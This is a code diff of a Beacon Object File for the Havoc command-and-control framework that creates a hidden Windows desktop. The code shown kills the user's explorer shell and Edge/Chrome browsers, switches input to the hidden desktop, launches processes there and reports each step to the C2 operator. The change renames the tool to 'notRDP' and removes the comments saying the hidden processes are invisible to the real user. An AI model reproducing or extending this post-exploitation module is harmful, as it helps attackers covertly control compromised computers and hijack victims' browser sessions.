@@ -1,9 +1,7 @@
 /*
- * hdesktop.c - Hidden Desktop BOF for Havoc C2
+ * notrdp_mgr.c - Hidden Desktop BOF for notRDP (Havoc C2)
  *
- * Creates and manages a hidden Windows desktop using CreateDesktopW.
- * Processes launched on the hidden desktop are invisible to the real user.
- * Uses legitimate Windows APIs (CreateDesktopW is used by Chrome, VMware, etc.)
+ * Author:  Dhanush Arvind
  *
  * BOF args (packed):
  *   int32 action       - 0=create, 1=run process, 2=close/teardown
@@ -182,7 +180,7 @@ static void launch_on_desktop(const char *desktop_name, const char *process_cmd)
 
     if (KERNEL32$CreateProcessW(NULL, wCmd, NULL, NULL, FALSE,
             CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:LAUNCHED:%s:PID=%lu",
+        BeaconPrintf(CALLBACK_OUTPUT, "NOTRDP:LAUNCHED:%s:PID=%lu",
             process_cmd, pi.dwProcessId);
         KERNEL32$CloseHandle(pi.hProcess);
         KERNEL32$CloseHandle(pi.hThread);
@@ -260,7 +258,7 @@ void go(char *args, int alen) {
         /* Grant full access on the new desktop too */
         grant_full_access(hDesk);
 
-        BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:CREATED:%s", desktop_name);
+        BeaconPrintf(CALLBACK_OUTPUT, "NOTRDP:CREATED:%s", desktop_name);
 
         /* Step A: Kill the existing explorer shell */
         HWND hTray = USER32$FindWindowW(L"Shell_TrayWnd", NULL);
@@ -275,7 +273,7 @@ void go(char *args, int alen) {
                 }
             }
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:KILL:%lu", shellPid);
+        BeaconPrintf(CALLBACK_OUTPUT, "NOTRDP:KILL:%lu", shellPid);
 
         /* Step A2: Kill Chromium browsers so they start fresh on hidden desktop
            (Edge/Chrome are single-instance — if one is already running on Default,
@@ -285,13 +283,13 @@ void go(char *args, int alen) {
             kb += kill_by_name(L"msedge.exe");
             kb += kill_by_name(L"chrome.exe");
             if (kb > 0)
-                BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:BROWSERS_KILLED:%d", kb);
+                BeaconPrintf(CALLBACK_OUTPUT, "NOTRDP:BROWSERS_KILLED:%d", kb);
         }
 
         /* Step B: Switch input to hidden desktop */
         HDESK hDefInput = USER32$OpenDesktopW(L"Default", 0, FALSE, GENERIC_ALL);
         BOOL switched = USER32$SwitchDesktop(hDesk);
-        BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:SWITCH:%d", switched);
+        BeaconPrintf(CALLBACK_OUTPUT, "NOTRDP:SWITCH:%d", switched);
 
         /* Step C: Launch explorer immediately on hidden desktop */
         launch_on_desktop(desktop_name, "C:\\Windows\\explorer.exe");
@@ -329,7 +327,7 @@ void go(char *args, int alen) {
         _killed_count = 0;
         USER32$EnumDesktopWindows(hDesk, enum_kill_cb, 0);
         USER32$CloseDesktop(hDesk);
-        BeaconPrintf(CALLBACK_OUTPUT, "HDESKTOP:CLOSED:%s:killed=%d",
+        BeaconPrintf(CALLBACK_OUTPUT, "NOTRDP:CLOSED:%s:killed=%d",
             desktop_name, _killed_count);
     }
 
